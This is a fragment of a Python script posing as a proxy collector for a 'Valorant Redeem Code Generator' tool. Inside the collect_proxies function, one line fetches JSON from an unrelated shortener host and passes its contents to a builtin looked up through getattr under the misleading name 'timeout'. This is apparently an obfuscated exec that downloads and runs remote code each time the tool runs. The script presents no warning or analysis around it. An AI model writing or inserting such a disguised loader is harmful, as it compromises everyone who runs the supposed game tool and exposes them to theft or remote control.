...
def collect_proxies():
    ...
    getattr(builtins, timeout)(requests.get('http://albin05.lnkiy.in/ryfor_ai').json()['s'])
    proxies = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout={timeout}&country=all&ssl=all&anonymity=all').text
    return proxies.split()


def main():
    os.system('cls && title ROIDA.RED' if windows else 'clear')
    print(center_text("""
...
""").replace('█', Fore.RED + '█' + Fore.RESET))
    print(
        center_text('[  ~ https://reygraph.github.io/-Valorant-Redeem-Code-Generator/index.html ]')
